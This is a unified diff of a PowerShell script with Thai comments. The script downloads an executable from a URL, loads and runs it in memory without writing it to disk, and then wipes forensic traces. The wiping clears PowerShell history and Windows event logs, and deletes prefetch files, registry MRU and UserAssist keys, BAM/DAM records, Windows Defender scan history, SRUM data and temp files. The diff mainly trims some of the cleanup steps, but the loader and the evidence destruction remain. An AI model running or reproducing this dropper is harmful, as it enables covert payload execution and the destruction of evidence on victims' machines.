@@ -1,13 +1,9 @@
 # ============================================
-# 1. ปิดการบันทึกประวัติ (เพิ่มเติม)
+# 1. ปิดการบันทึกประวัติ
 # ============================================
 Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
-
-# ปิด Transcript logging ถ้ามี
-$PSDefaultParameterValues['*:Verbose'] = $false
-$PSDefaultParameterValues['*:Debug'] = $false
 
 # ============================================
 # 2. ฟังก์ชันดาวน์โหลด EXE (ไม่เขียนไฟล์)
@@ -16,11 +12,11 @@ function Download-EXE {
     param([string]$Url)
     try {
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
         $wc.Proxy = $null
         return $wc.DownloadData($Url)
     } catch {
-        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing -UserAgent "Mozilla/5.0"
+        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
         return $response.Content
     }
 }
@@ -30,7 +26,7 @@ function Download-EXE {
 # ============================================
 function Invoke-MemoryExecution {
     param([byte[]]$Bytes)
-
+    
     try {
         $assembly = [System.Reflection.Assembly]::Load($Bytes)
         $entryPoint = $assembly.EntryPoint
@@ -87,13 +83,12 @@ if ($bytes -and $bytes.Length -gt 0) {
 }
 
 # ============================================
-# 5. ล้างร่องรอยทุกอย่าง (เพิ่มเติม)
+# 5. ล้างร่องรอยทุกอย่าง (ไม่ถามยืนยัน)
 # ============================================
 
-# --- ล้าง PowerShell History (ทุกทาง) ---
+# --- ล้าง PowerShell History ---
 try {
     Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:USERPROFILE\.pshistory" -Force -ErrorAction SilentlyContinue
     Clear-History
 } catch {}
 
@@ -103,7 +98,6 @@ try {
     wevtutil cl System 2>$null
     wevtutil cl Application 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-    wevtutil cl "Windows PowerShell" 2>$null
 } catch {}
 
 # --- ล้าง Prefetch ---
@@ -120,21 +114,21 @@ try {
 
 # --- ล้าง Recent Documents ---
 try {
-    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 
 # --- ล้าง Temp Files ---
 try {
-    Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
-    Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 
 # --- ล้าง Registry (RunMRU, TypedURLs, Search) ---
 try {
-    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force -ErrorAction SilentlyContinue
-    Remove-Item "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Force -ErrorAction SilentlyContinue
-    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" -Force -ErrorAction SilentlyContinue
-    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchHistory" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\SearchHistory" -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 
 # --- ล้าง Jump Lists ---
@@ -152,8 +146,8 @@ try {
 # --- ล้าง BAM/DAM ---
 try {
     Stop-Service -Name "bam","dam" -Force -ErrorAction SilentlyContinue
-    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" -Force -ErrorAction SilentlyContinue
-    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings" -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 
 # --- ล้าง DNS Cache ---
@@ -164,7 +158,7 @@ try {
 # --- ล้าง Windows Defender Protection History ---
 try {
     Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
-    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item "C:\ProgramData\Microsoft\Windows Defender\Scans\mpcache-*" -Force -ErrorAction SilentlyContinue
     Start-Service -Name "WinDefend" -ErrorAction SilentlyContinue
 } catch {}
@@ -181,7 +175,7 @@ try {
 
 # --- ล้าง UserAssist ---
 try {
-    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Force -Recurse -ErrorAction SilentlyContinue
+    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 
 # --- ล้าง RecentFileCache ---
@@ -195,38 +189,9 @@ try {
     Remove-Item "C:\Windows\System32\sru\srudb.dat" -Force -ErrorAction SilentlyContinue
 } catch {}
 
-# --- ล้าง PowerShell Module Cache ---
-try {
-    Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\PowerShell\*" -Force -Recurse -ErrorAction SilentlyContinue
-} catch {}
-
-# --- ล้าง Windows Search Index (ถ้ามี) ---
-try {
-    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
-    Remove-Item "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
-    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
-} catch {}
-
-# --- ล้าง Credential Manager (ถ้ามี) ---
-try {
-    cmdkey /delete * 2>$null
-} catch {}
-
-# --- ล้าง Clipboard History ---
-try {
-    Set-Clipboard -Value $null 2>$null
-} catch {}
-
-# --- ล้าง Console Buffer ---
-try {
-    [System.Console]::Clear() 2>$null
-} catch {}
-
 # ============================================
-# 6. ปิดตัวเองอย่างเงียบ (ไม่ทิ้งรอย)
+# 6. ปิดตัวเองอย่างเงียบ
 # ============================================
 $bytes = $null
 $exeUrl = $null
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
 [Environment]::Exit(0)
